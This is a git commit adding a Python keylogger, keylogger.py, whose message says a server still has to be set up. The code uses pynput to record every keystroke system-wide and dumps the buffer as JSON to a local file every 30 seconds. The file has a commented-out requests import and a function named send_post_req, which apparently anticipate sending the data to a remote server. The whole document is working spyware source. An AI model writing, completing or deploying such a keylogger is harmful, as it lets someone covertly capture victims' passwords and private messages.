3acc90435de460c05b5e619df4fe084a747a4ca3
abdelwahabkr <abdelwahabkdr12@gmail.com>
2025-10-16 21:30:03 +0100

    keylogger (have to set up a server)

---
+++ KeyLogger/keylogger.py
@@ -0,0 +1,49 @@
+from pynput import keyboard
+#import requests
+import json
+import threading
+
+text = ""
+
+time_interval = 30
+
+def send_post_req():
+    global text
+    try:
+        payload = json.dumps({"keyboardData" : text})
+        with open("test.txt", "a", encoding="utf-8") as f:
+            f.write(payload + "\n")
+        
+        text = ""
+        timer = threading.Timer(time_interval, send_post_req)
+        timer.start()
+    except Exception as e:
+        print(e)
+        print("Couldn't complete request!")
+
+def on_press(key):
+    global text
+
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text += "\t"
+    elif key == keyboard.Key.space:
+        text += " "
+    elif key == keyboard.Key.shift:
+        pass
+    elif key == keyboard.Key.backspace and len(text) == 0:
+        pass
+    elif key == keyboard.Key.backspace and len(text) > 0:
+        text = text[:-1]
+    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        text += str(key).strip("'")
+
+with keyboard.Listener(
+    on_press=on_press) as listener:
+    send_post_req()
+    listener.join()
